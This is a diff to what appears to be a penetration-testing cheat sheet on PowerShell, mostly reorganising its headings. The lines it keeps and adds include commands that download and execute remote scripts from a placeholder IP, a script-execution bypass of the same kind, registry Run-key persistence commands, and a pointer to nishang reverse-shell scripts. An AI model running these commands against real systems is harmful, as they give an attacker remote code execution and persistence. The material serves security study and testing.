@@ -620,7 +620,9 @@ New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Prop
 Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $key_name -Value "$new_value"
 ```
 
-## MISC Unsorted
+## MISC
+
+### PowerShell.exe location on disk
 
 {% tabs %}
 {% tab title="Windows" %}
@@ -632,7 +634,7 @@ PowerShell.exe full path: `/usr/local/microsoft/powershell/7/`
 {% endtab %}
 {% endtabs %}
 
-Get tons of computer info in PowerShell: `Get-ComputerInfo`
+### `wget` with PowerShell
 
 Fully PowerShell version of `wget`. Retrieve file and execute remote code after downloading:
 
@@ -640,21 +642,25 @@ Fully PowerShell version of `wget`. Retrieve file and execute remote code after 
 powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://<ip>:<port>/<filename>')"
 ```
 
-Can also use `wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html` to save the file to the local machine.  `wget` is an alias for `Invoke-WebRequest`. Adding `-Outfile` is needed to save the file to disk.
+Can also use the example below to save the file to the local machine.
 
-PowerShell Script Execution Bypass: \[can embed in php too! TODO: write script example of this\]:
+```text
+wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html
+```
+
+`wget` is an alias for `Invoke-WebRequest`. Adding `-Outfile $out_file` is needed to save the file to disk.
+
+### PowerShell Script Execution Bypass: 
+
+\[can embed in php too! TODO: write script example of this\]:
 
 ```text
 Echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | PowerShell -NoProfile -
 ```
 
+### Unsorted...
+
 PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)
-
-### 
-
-### List environment variables
-
-`dir env:`
 
 ## Resources
 
